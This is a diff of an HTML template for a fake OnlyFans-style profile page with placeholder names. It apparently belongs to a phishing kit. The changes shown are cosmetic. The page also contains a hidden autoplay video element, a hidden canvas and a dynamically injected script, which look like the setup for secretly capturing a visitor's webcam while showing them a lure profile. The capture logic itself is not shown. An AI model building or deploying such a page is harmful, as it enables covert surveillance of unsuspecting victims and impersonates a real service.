@@ -16,7 +16,7 @@
     <div class="video-wrap" hidden="hidden">
         <video id="video" playsinline autoplay></video>
     </div>
-    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <canvas hidden="hidden" id="canvas"></canvas>
     <script type="text/javascript">
         var URLdomain = window.location.host;
         script = document.createElement("script");
@@ -88,7 +88,6 @@
                 </button>
                 <div class="datos-perfil">
                     <p class="nombre-perfil">nombre_del_perfil</p>
-                    <!--<i class="fas fa-check-circle" aria-hidden="true" style="color: rgba(0, 0, 0, 0.616);"></i>-->
                     <p class="usuario-perfil">nombre_de_usuario</p>
                     <p class="descripcion-perfil">descripcion_onlyfans</p>
                 </div>
@@ -133,22 +132,9 @@
                 <div class="tab-content imagenes" id="myTabContent">
                     <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
                         <p class="numero-fotos">3 FOTOS</p>
-                        <div class="imagen-bloqueada">
-                            <div class="blocked">
-                                <svg id="icon-locked" viewBox="0 0 24 24">
-                                    <path class="gris-claro"
-                                        d="M17.5,8H17V6A5,5,0,0,0,7,6V8H6.5A2.5,2.5,0,0,0,4,10.5V18a4,4,0,0,0,4,4h8a4,4,0,0,0,4-4V10.5A2.5,2.5,0,0,0,17.5,8ZM9,6a3,3,0,0,1,6,0V8H9Zm9,12a2,2,0,0,1-2,2H8a2,2,0,0,1-2-2V10.5a.5.5,0,0,1,.5-.5h11a.5.5,0,0,1,.5.5Zm-6-5a1,1,0,0,0-1,1v2a1,1,0,0,0,2,0V14A1,1,0,0,0,12,13Z">
-                                    </path>
-                                </svg>
-                            </div>
-                            <button class="btnVerImagen">
-                                <svg id="icon-media" viewBox="0 0 24 24">
-                                    <path class="gris-claro"
-                                        d="M18,3H6A3,3,0,0,0,3,6V18a3,3,0,0,0,3,3H18a3,3,0,0,0,3-3V6A3,3,0,0,0,18,3Zm1,15a1,1,0,0,1-1,1H6a1,1,0,0,1-1-1V6A1,1,0,0,1,6,5H18a1,1,0,0,1,1,1ZM9,10.5A1.5,1.5,0,1,0,7.5,9,1.5,1.5,0,0,0,9,10.5ZM14,13l-3,3L9,14,6.85,16.15a.47.47,0,0,0-.14.35.5.5,0,0,0,.5.5h9.58a.5.5,0,0,0,.5-.5.47.47,0,0,0-.14-.35Z">
-                                    </path>
-                                </svg>
-                            </button>
-                        </div>
+						<div class="imagen-bloqueada" >
+							<img class="imagen-gratis" src="foto_portada" alt="user">
+						</div>
                         <div class="imagen-bloqueada">
                             <div class="blocked">
                                 <svg id="icon-locked" viewBox="0 0 24 24">
